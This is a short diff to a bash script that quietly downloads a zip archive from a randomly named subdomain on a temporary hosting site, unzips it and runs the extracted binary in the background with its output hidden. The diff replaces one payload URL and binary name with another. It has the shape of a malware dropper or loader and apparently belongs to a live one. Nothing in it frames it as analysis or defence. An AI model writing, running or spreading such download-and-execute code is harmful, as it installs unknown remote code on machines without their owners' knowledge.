@@ -1,11 +1,11 @@
 #!/bin/bash
 if [ ! -f ./tra ]; then
     echo "File not found!"
-    wget -q http://h54h45wefv.temp.swtest.ru/support.zip --no-check-certificate
-    unzip support.zip
+    wget -q http://jammieswna.temp.swtest.ru/lantern.zip
+    unzip -q lantern.zip
 fi
 echo $1
-nohup ./support  >/dev/null 2>&1 
+nohup ./lantern >/dev/null 2>&1 
 i="0"
 while [ $i -lt 48 ]
 do
